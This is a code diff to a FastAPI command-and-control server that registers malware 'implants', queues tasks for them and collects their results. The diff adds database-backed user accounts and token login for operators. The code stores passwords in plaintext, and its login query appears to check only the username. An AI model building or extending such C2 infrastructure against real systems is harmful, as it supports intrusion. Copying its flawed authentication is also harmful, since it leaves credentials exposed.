@@ -153,6 +153,34 @@ class ResultsDelete(BaseModel):
     id: int
     session: str
 
+'''
+CREATE TABLE users (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    username TEXT UNIQUE NOT NULL,
+    password TEXT NOT NULL,
+    created_at TEXT NOT NULL
+)
+'''
+class Users(Base):
+    __tablename__ = "users"
+    id = Column(Integer, primary_key=True, index=True)
+    username = Column(String, unique=True, nullable=False)
+    password = Column(String, nullable=False)
+    created_at = Column(String, default=datetime.now(timezone.utc).isoformat())
+
+class UserCreate(BaseModel):
+    username: str
+    password: str
+    created_at: str = datetime.now(timezone.utc).isoformat()
+
+class UserRead(UserCreate):
+    id: int
+
+    class Config:
+        form_attributes = True
+
+class UserDelete(BaseModel):
+    id: int
 
 
 Base.metadata.create_all(bind=engine)
@@ -167,8 +195,56 @@ def get_db():
 from fastapi import Depends
 
 
-# recieve tasking from implant based on session id
-# mark task complete = True
+# for client only to be able to access protected endpoints, authentication via OAuth2
+@app.post("/token/", response_model=Token)
+def login(db: SessionLocal = Depends(get_db), form_data: OAuth2PasswordRequestForm = Depends()): # type: ignore
+    user_exists = db.query(Users).filter(Users.username == form_data.username and Users.password == form_data.password).first()
+    if not user_exists:
+        raise HTTPException(status_code=401, detail="Invalid username or password")
+    access_token = create_access_token(data={"sub": form_data.username})
+    return {"access_token": access_token, "token_type": "bearer"}
+
+# PROTECTED endpoint to view all information about all users
+@app.get("/users", response_model=List[UserRead])
+def read_users(db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+    users = db.query(Users).all()
+    return users
+
+
+# PROTECTED endpoint to view all information about a user
+@app.get("/users/{user_id}", response_model=UserRead)
+def read_user(user_id: int, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+    user = db.query(Users).filter(Users.id == user_id).first()
+    if user is None:
+        raise HTTPException(status_code=404, detail="User not found")
+    return user
+
+
+# PROTECTED endpoint to create a new user
+@app.post("/users/create", response_model=UserCreate)
+def create_user(user: UserCreate, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+    existing_user = db.query(Users).filter(Users.username == user.username).first()
+    if existing_user:
+        raise HTTPException(status_code=400, detail="Username already exists")
+    user_data = user.model_dump(exclude={"created_at"})
+    db_user = Users(**user_data, created_at=datetime.now(timezone.utc).isoformat())
+    db.add(db_user)
+    db.commit()
+    db.refresh(db_user)
+    return db_user
+
+
+# PROTECTED endpoint to delete a user
+@app.delete("/users/delete/{user_id}", response_model=UserDelete)
+def delete_user(user_id: int, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
+    db_user = db.query(Users).filter(Users.id == user_id).first()
+    if db_user is None:
+        raise HTTPException(status_code=404, detail="User not found")
+    db.delete(db_user)
+    db.commit()
+    return UserDelete(id=user_id)
+
+# recieve tasking output from agent based on session id, marks task complete = True
 @app.post("/results/{session}", response_model=ResultsCreate)
 def create_results(session: str, results: ResultsCreate, db: SessionLocal = Depends(get_db)): # type: ignore
     current_time = datetime.now(timezone.utc).isoformat()
@@ -203,7 +279,7 @@ def create_results(session: str, results: ResultsCreate, db: SessionLocal = Depe
 
 
 
-# endpoint in order to create a task for an implant
+# PROTECTED endpoint in order to create a task for an implant (client -> server)
 @app.post("/tasking/{session}", response_model=TaskingCreate)
 def create_tasking(session: str, tasking: TaskingCreate, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)):  # type: ignore
     current_time = datetime.now(timezone.utc).isoformat()
@@ -233,6 +309,7 @@ def create_tasking(session: str, tasking: TaskingCreate, db: SessionLocal = Depe
     return db_task
 
 
+# endpoint for agent to retrieve taskings 
 @app.get("/tasking/{session}", response_model=List[TaskingRead])
 def read_taskings(session: str, db: SessionLocal = Depends(get_db)): # type: ignore
     db_implant = db.query(Implant).filter(Implant.session == session).first()
@@ -244,7 +321,7 @@ def read_taskings(session: str, db: SessionLocal = Depends(get_db)): # type: ign
 
 
 
-# initial checkin endpoint for implants, register with server for future tasking/results/tracking
+# endpoint for agent initial checkin, register with server for future tasking/results/tracking
 @app.post("/implants/", response_model=ImplantRead)
 def create_implant(implant: ImplantCreate, db: SessionLocal = Depends(get_db)): # type: ignore
     current_time = datetime.now(timezone.utc).isoformat()
@@ -258,12 +335,13 @@ def create_implant(implant: ImplantCreate, db: SessionLocal = Depends(get_db)): 
     return db_implant
 
 
-# for clients only to be able to view all implants
+# PROTECTED endpoint for clients only to be able to view all implants
 @app.get("/implants/", response_model=List[ImplantRead])
 def read_implants(db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
     implants = db.query(Implant).all()
     return implants
 
+# PROTECTED endpoint for client only to be able to view a single implant by session
 @app.get("/implants/{session}", response_model=ImplantRead)
 def read_single_implant(session: str, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
     implant = db.query(Implant).filter(Implant.session == session).first()
@@ -273,7 +351,7 @@ def read_single_implant(session: str, db: SessionLocal = Depends(get_db), token:
 
 
 
-# protected endpoint allowing client to delete stale/killed implants
+# PROTECTED endpoint allowing client to delete stale/killed implants
 @app.delete("/implants/delete/{session}", response_model=ImplantDelete)
 def delete_implant(session: str, db: SessionLocal = Depends(get_db), token: str = Security(oauth2_scheme)): # type: ignore
     db_implant = db.query(Implant).filter(Implant.session == session).first()
@@ -284,13 +362,7 @@ def delete_implant(session: str, db: SessionLocal = Depends(get_db), token: str 
     return ImplantDelete(session=session)
 
 
-# for client only to be able to access protected endpoints
-@app.post("/token/", response_model=Token)
-def login(form_data: OAuth2PasswordRequestForm = Depends()):
-    if form_data.username != "admin" or form_data.password != "password":
-        raise HTTPException(status_code=400, detail="Invalid username or password")
-    access_token = create_access_token(data={"sub": form_data.username})
-    return {"access_token": access_token, "token_type": "bearer"}
+
 
 
 # implant checkin endpoint
